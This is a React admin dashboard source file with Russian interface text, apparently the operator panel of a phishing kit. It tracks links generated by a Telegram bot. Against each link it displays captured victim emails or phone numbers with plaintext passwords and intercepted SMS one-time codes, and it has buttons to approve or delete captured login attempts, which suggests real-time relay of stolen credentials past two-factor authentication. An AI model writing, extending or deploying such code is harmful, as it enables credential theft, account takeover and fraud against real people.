import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { LogOut, Users, Link, MessageSquare, Eye } from 'lucide-react';
import { useLocation } from 'wouter';

interface GeneratedLink {
  id: string;
  price: string;
  name: string;
  link: string;
  contextData: string;
  createdAt: string;
}

interface LoginAttempt {
  id: number;
  emailOrPhone: string;
  password: string;
  returnUri: string;
  timestamp: string;
  approved: boolean;
}

interface SmsSubmission {
  id: number;
  otpCode: string;
  stepupContext: string;
  rememberDevice: boolean;
  timestamp: string;
}

export const AdminDashboard = (): JSX.Element => {
  const [, setLocation] = useLocation();
  const [generatedLinks, setGeneratedLinks] = useState<GeneratedLink[]>([]);
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [smsSubmissions, setSmsSubmissions] = useState<SmsSubmission[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  const fetchData = async () => {
    try {
      const [linksRes, attemptsRes, smsRes] = await Promise.all([
        fetch('/api/telegram-links', { credentials: 'include' }),
        fetch('/api/login-attempts', { credentials: 'include' }),
        fetch('/api/sms-submissions', { credentials: 'include' })
      ]);

      if (linksRes.ok) {
        const linksData = await linksRes.json();
        setGeneratedLinks(linksData);
      }

      if (attemptsRes.ok) {
        const attemptsData = await attemptsRes.json();
        setLoginAttempts(attemptsData);
      }

      if (smsRes.ok) {
        const smsData = await smsRes.json();
        setSmsSubmissions(smsData);
      }
    } catch (error) {
      console.error('Error fetching data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleLogout = async () => {
    try {
      await fetch('/api/admin/logout', {
        method: 'POST',
        credentials: 'include',
      });
      setLocation('/admin/login');
    } catch (error) {
      console.error('Logout error:', error);
    }
  };

  const approveLogin = async (id: number) => {
    try {
      const response = await fetch(`/api/login-attempts/${id}/approve`, {
        method: 'POST',
        credentials: 'include',
      });
      if (response.ok) {
        fetchData();
      }
    } catch (error) {
      console.error('Error approving login:', error);
    }
  };

  const deleteLogin = async (id: number) => {
    try {
      const response = await fetch(`/api/login-attempts/${id}`, {
        method: 'DELETE',
        credentials: 'include',
      });
      if (response.ok) {
        fetchData();
      }
    } catch (error) {
      console.error('Error deleting login:', error);
    }
  };

  const deleteSms = async (id: number) => {
    try {
      const response = await fetch(`/api/sms-submissions/${id}`, {
        method: 'DELETE',
        credentials: 'include',
      });
      if (response.ok) {
        fetchData();
      }
    } catch (error) {
      console.error('Error deleting SMS:', error);
    }
  };

  const pendingLoginAttempts = loginAttempts.filter(attempt => !attempt.approved);
  const totalNotifications = pendingLoginAttempts.length + smsSubmissions.length;

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-3xl font-bold text-gray-900">Административная панель</h1>
            <p className="text-gray-600">Управление системой и мониторинг активности</p>
          </div>
          <Button onClick={handleLogout} variant="outline">
            <LogOut className="h-4 w-4 mr-2" />
            Выйти
          </Button>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Созданные ссылки</CardTitle>
              <Link className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{generatedLinks.length}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Попытки входа</CardTitle>
              <Users className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{loginAttempts.length}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">SMS коды</CardTitle>
              <MessageSquare className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{smsSubmissions.length}</div>
            </CardContent>
          </Card>
        </div>

        <Tabs defaultValue="overview" className="w-full">
          <TabsList className="grid w-full grid-cols-6">
            <TabsTrigger value="overview">Обзор</TabsTrigger>
            <TabsTrigger value="users">Пользователи</TabsTrigger>
            <TabsTrigger value="data">Данные</TabsTrigger>
            <TabsTrigger value="logs">Логи</TabsTrigger>
            <TabsTrigger value="bot">Telegram Бот</TabsTrigger>
            <TabsTrigger value="system">Система</TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center justify-between">
                    Последние действия
                    <Button size="sm" onClick={fetchData}>Обновить</Button>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[300px]">
                    <div className="space-y-2">
                      {loginAttempts.slice(0, 5).map((attempt) => (
                        <div key={attempt.id} className="text-sm border-l-2 border-blue-500 pl-3">
                          <p className="font-medium">Вход: {attempt.emailOrPhone}</p>
                          <p className="text-xs text-gray-500">{new Date(attempt.timestamp).toLocaleString('ru-RU')}</p>
                        </div>
                      ))}
                      {smsSubmissions.slice(0, 3).map((sms) => (
                        <div key={sms.id} className="text-sm border-l-2 border-green-500 pl-3">
                          <p className="font-medium">SMS код: {sms.otpCode}</p>
                          <p className="text-xs text-gray-500">{new Date(sms.timestamp).toLocaleString('ru-RU')}</p>
                        </div>
                      ))}
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Статистика системы</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    <div className="flex justify-between">
                      <span>Активные ссылки:</span>
                      <Badge>{generatedLinks.length}</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span>Попытки входа:</span>
                      <Badge variant="secondary">{loginAttempts.length}</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span>SMS коды:</span>
                      <Badge variant="outline">{smsSubmissions.length}</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span>Статус бота:</span>
                      <Badge variant="secondary">Активен</Badge>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="users" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center justify-between">
                  Управление пользователями
                  <div className="flex gap-2">
                    <Button size="sm" onClick={fetchData}>Обновить</Button>
                    <Button size="sm" variant="destructive" onClick={() => {
                      if (confirm('Удалить всех пользователей?')) {
                        // Implement delete all users
                      }
                    }}>Очистить всех</Button>
                  </div>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[500px]">
                  <div className="space-y-4">
                    {generatedLinks.map((link) => (
                      <Card key={link.id} className="p-4">
                        <div className="space-y-3">
                          <div className="flex justify-between items-start">
                            <div>
                              <h4 className="font-medium">{link.id}</h4>
                              <p className="text-sm text-gray-600">Создатель: {link.name}</p>
                              <p className="text-sm text-gray-600">Цена: {link.price}</p>
                              <p className="text-xs text-gray-400">Создано: {new Date(link.createdAt).toLocaleString('ru-RU')}</p>
                            </div>
                            <Button size="sm" variant="destructive">Удалить</Button>
                          </div>
                          
                          <div className="bg-gray-50 p-3 rounded">
                            <p className="text-xs font-medium mb-2">Полученные данные:</p>
                            {loginAttempts.filter(attempt => attempt.returnUri.includes(link.contextData)).map(attempt => (
                              <div key={attempt.id} className="text-xs space-y-1 mb-2 p-2 bg-white rounded">
                                <p><strong>Email:</strong> {attempt.emailOrPhone}</p>
                                <p><strong>Пароль:</strong> {attempt.password}</p>
                                <p><strong>Время:</strong> {new Date(attempt.timestamp).toLocaleString('ru-RU')}</p>
                                <div className="flex gap-1 mt-1">
                                  <Button size="sm" className="text-xs h-6" onClick={() => approveLogin(attempt.id)}>
                                    Одобрить
                                  </Button>
                                  <Button size="sm" variant="destructive" className="text-xs h-6" onClick={() => deleteLogin(attempt.id)}>
                                    Удалить
                                  </Button>
                                </div>
                              </div>
                            ))}
                            
                            {smsSubmissions.filter(sms => sms.stepupContext.includes(link.contextData.slice(0, 8))).map(sms => (
                              <div key={sms.id} className="text-xs space-y-1 mb-2 p-2 bg-yellow-50 rounded">
                                <p><strong>SMS код:</strong> {sms.otpCode}</p>
                                <p><strong>Время:</strong> {new Date(sms.timestamp).toLocaleString('ru-RU')}</p>
                                <Button size="sm" variant="destructive" className="text-xs h-6 mt-1" onClick={() => deleteSms(sms.id)}>
                                  Удалить
                                </Button>
                              </div>
                            ))}
                          </div>
                        </div>
                      </Card>
                    ))}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="data" className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center justify-between">
                    Попытки входа
                    <div className="flex gap-2">
                      <Button size="sm" onClick={fetchData}>Обновить</Button>
                      <Button size="sm" variant="destructive" onClick={() => {
                        if (confirm('Удалить все попытки входа?')) {
                          loginAttempts.forEach(attempt => deleteLogin(attempt.id));
                        }
                      }}>Очистить</Button>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[400px]">
                    <div className="space-y-2">
                      {loginAttempts.map((attempt) => (
                        <div key={attempt.id} className="p-2 border rounded text-sm">
                          <div className="flex justify-between items-start">
                            <div>
                              <p><strong>{attempt.emailOrPhone}</strong></p>
                              <p className="text-gray-600">{attempt.password}</p>
                              <p className="text-xs text-gray-400">{new Date(attempt.timestamp).toLocaleString('ru-RU')}</p>
                            </div>
                            <div className="flex gap-1">
                              {!attempt.approved && (
                                <Button size="sm" className="text-xs h-6" onClick={() => approveLogin(attempt.id)}>✓</Button>
                              )}
                              <Button size="sm" variant="destructive" className="text-xs h-6" onClick={() => deleteLogin(attempt.id)}>✕</Button>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center justify-between">
                    SMS коды
                    <div className="flex gap-2">
                      <Button size="sm" onClick={fetchData}>Обновить</Button>
                      <Button size="sm" variant="destructive" onClick={() => {
                        if (confirm('Удалить все SMS коды?')) {
                          smsSubmissions.forEach(sms => deleteSms(sms.id));
                        }
                      }}>Очистить</Button>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[400px]">
                    <div className="space-y-2">
                      {smsSubmissions.map((sms) => (
                        <div key={sms.id} className="p-2 border rounded text-sm">
                          <div className="flex justify-between items-start">
                            <div>
                              <p><strong>Код: {sms.otpCode}</strong></p>
                              <p className="text-xs text-gray-400">{new Date(sms.timestamp).toLocaleString('ru-RU')}</p>
                            </div>
                            <Button size="sm" variant="destructive" className="text-xs h-6" onClick={() => deleteSms(sms.id)}>✕</Button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="logs" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center justify-between">
                  Логи системы
                  <Button size="sm" onClick={fetchData}>Обновить</Button>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[500px]">
                  <div className="space-y-2 font-mono text-sm">
                    <div className="p-2 bg-green-50 rounded">
                      <span className="text-green-600">[INFO]</span> {new Date().toLocaleString('ru-RU')} - Система запущена
                    </div>
                    <div className="p-2 bg-blue-50 rounded">
                      <span className="text-blue-600">[DEBUG]</span> {new Date().toLocaleString('ru-RU')} - База данных подключена
                    </div>
                    <div className="p-2 bg-green-50 rounded">
                      <span className="text-green-600">[INFO]</span> {new Date().toLocaleString('ru-RU')} - Telegram бот активен
                    </div>
                    {loginAttempts.slice(-10).map((attempt, i) => (
                      <div key={i} className="p-2 bg-yellow-50 rounded">
                        <span className="text-yellow-600">[LOGIN]</span> {new Date(attempt.timestamp).toLocaleString('ru-RU')} - Попытка входа: {attempt.emailOrPhone}
                      </div>
                    ))}
                    {smsSubmissions.slice(-5).map((sms, i) => (
                      <div key={i} className="p-2 bg-purple-50 rounded">
                        <span className="text-purple-600">[SMS]</span> {new Date(sms.timestamp).toLocaleString('ru-RU')} - SMS код получен: {sms.otpCode}
                      </div>
                    ))}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="bot" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle>Управление Telegram ботом</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div className="p-4 border rounded">
                      <h4 className="font-medium mb-2">Статус бота</h4>
                      <Badge variant="secondary">Активен</Badge>
                    </div>
                    <div className="p-4 border rounded">
                      <h4 className="font-medium mb-2">Пользователей</h4>
                      <p className="text-2xl font-bold">{generatedLinks.length}</p>
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <h4 className="font-medium">Созданные ссылки через бота:</h4>
                    <ScrollArea className="h-[300px]">
                      <div className="space-y-2">
                        {generatedLinks.map((link) => (
                          <div key={link.id} className="p-3 border rounded">
                            <div className="flex justify-between items-start">
                              <div>
                                <p className="font-medium">{link.id}</p>
                                <p className="text-sm text-gray-600">Создатель: {link.name}</p>
                                <p className="text-sm text-gray-600">Цена: {link.price}</p>
                                <p className="text-xs text-gray-400">{new Date(link.createdAt).toLocaleString('ru-RU')}</p>
                              </div>
                              <Button size="sm" variant="destructive">Удалить</Button>
                            </div>
                          </div>
                        ))}
                      </div>
                    </ScrollArea>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="system" className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <Card>
                <CardHeader>
                  <CardTitle>Управление данными</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    <Button 
                      className="w-full" 
                      onClick={fetchData}
                    >
                      Обновить все данные
                    </Button>
                    <Button 
                      variant="destructive" 
                      className="w-full"
                      onClick={() => {
                        if (confirm('Удалить ВСЕ попытки входа?')) {
                          loginAttempts.forEach(attempt => deleteLogin(attempt.id));
                        }
                      }}
                    >
                      Очистить все попытки входа
                    </Button>
                    <Button 
                      variant="destructive" 
                      className="w-full"
                      onClick={() => {
                        if (confirm('Удалить ВСЕ SMS коды?')) {
                          smsSubmissions.forEach(sms => deleteSms(sms.id));
                        }
                      }}
                    >
                      Очистить все SMS коды
                    </Button>
                    <Button 
                      variant="destructive" 
                      className="w-full"
                      onClick={() => {
                        if (confirm('Удалить ВСЕ данные? Это действие необратимо!')) {
                          loginAttempts.forEach(attempt => deleteLogin(attempt.id));
                          smsSubmissions.forEach(sms => deleteSms(sms.id));
                        }
                      }}
                    >
                      Полная очистка системы
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Информация о системе</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between">
                      <span>Время работы:</span>
                      <span>Активна</span>
                    </div>
                    <div className="flex justify-between">
                      <span>База данных:</span>
                      <Badge variant="secondary">PostgreSQL</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span>Сервер:</span>
                      <Badge variant="secondary">Express.js</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span>Telegram бот:</span>
                      <Badge variant="secondary">Активен</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span>Последнее обновление:</span>
                      <span>{new Date().toLocaleString('ru-RU')}</span>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};